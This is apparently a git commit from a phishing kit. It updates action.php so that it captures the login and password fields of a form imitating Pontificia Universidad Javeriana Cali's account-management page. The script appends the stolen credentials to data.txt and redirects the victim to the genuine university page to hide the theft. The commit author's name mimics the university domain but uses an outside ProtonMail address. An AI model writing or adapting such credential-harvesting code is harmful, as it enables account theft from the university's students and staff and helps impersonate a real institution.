3a36990355145e58efbac716f17d859a47ea576d
gcu.javerianacali.edu.co <cuentasdeusuario.javerianacali@protonmail.com>
2016-12-04 23:48:33 +0000

    Update action.php

--- action.php
+++ action.php
@@ -2,8 +2,8 @@
 header('Location: https://gcu.javerianacali.edu.co/GestionCuentasUsuariosPUJ/cuenta/modificarContrasena/VALIDAR');
 $txt = "data.txt";
 $fh = fopen($txt, 'w+');
-if (isset($_POST['login']) && isset($_POST['password'])) { // check if both fields are set
-   $txt=$_POST['field1'].' - '.$_POST['field2'];
+if (isset($_POST['cuentaUsuario.login']) && isset($_POST['cuentaUsuario.password'])) { // check if both fields are set
+   $txt=$_POST['cuentaUsuario.login'].' - '.$_POST['cuentaUsuario.password'];
    file_put_contents('data.txt',$txt."\n",FILE_APPEND); // log to data.txt
    exit();
 }
